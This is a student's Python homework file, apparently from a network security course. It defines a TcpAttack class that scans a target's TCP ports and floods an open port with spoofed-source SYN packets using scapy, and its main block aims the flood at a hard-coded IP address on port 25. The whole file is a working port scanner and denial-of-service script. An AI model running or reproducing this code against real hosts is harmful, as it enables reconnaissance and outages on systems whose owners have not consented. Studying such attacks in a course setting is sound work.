#Homework Number: 8
#Name: Parth Doshi
#ECN Login: doshi36
#Due Date: 03/20/2023

import socket
from scapy.all import *


class TcpAttack:
    def __init__(self, spoofIP, targetIP):
        """
        spoofIP (str): IP address to spoof 
        targetIP (str): IP address of the target computer to be attacked 
        """
        self.spoofIP = spoofIP
        self.targetIP = targetIP
    
    def scanTarget(self, rangeStart, rangeEnd):
        """
        rangeStart (int): The first port in the range of ports being scanned.
        rangeEnd (int): The last port in the range of ports being scanned.
        No return value, but writes open ports to openports.txt
        """

        f = open('openports.txt','w')                                                             
        # Scan the ports in the specified range:
        for x in range(rangeStart, rangeEnd+1,1):                               
            sock = socket.socket( socket.AF_INET, socket.SOCK_STREAM )               
            sock.settimeout(0.1)                                                     
            try:                                                                     
                sock.connect( (self.targetIP, x) )                                 
                string_to_write = str(x) + "\n"
                f.write(string_to_write)                                                                                           
            except:
                pass                                                                


    def attackTarget(self, port, numSyn):
        """
        port (int): The port that the attack will use
        numSyn (int): Number of SYN packets to send to target IP address and port.
        If the port is open, perform DoS attack and return 1. Otherwise return 0.
        """
        sock = socket.socket( socket.AF_INET, socket.SOCK_STREAM )               
        sock.settimeout(0.1)                                                     
        try:                                                                     
            sock.connect( (self.targetIP, port) )                                                                                                                           
        except:
            return 0
        for i in range(numSyn):                                                       
            IP_header = IP(src = self.spoofIP, dst = self.targetIP)                      
            TCP_header = TCP(flags = "S", sport = RandShort(), dport = port)     
            packet = IP_header / TCP_header                                          
            try:                                                                     
                send(packet)                                                          
            except Exception as e:                                                   
                pass
        return 1

if __name__ == "__main__":

    # Will contain actual IP addresses in real script
    spoofIP='10.1.1.1' ; targetIP='128.46.144.123'
    rangeStart= 1 ; rangeEnd= 100 ; port= 25
    Tcp = TcpAttack(spoofIP,targetIP)
    #Tcp.scanTarget(rangeStart, rangeEnd)

    if Tcp.attackTarget(port,10):
        print('port was open to attack')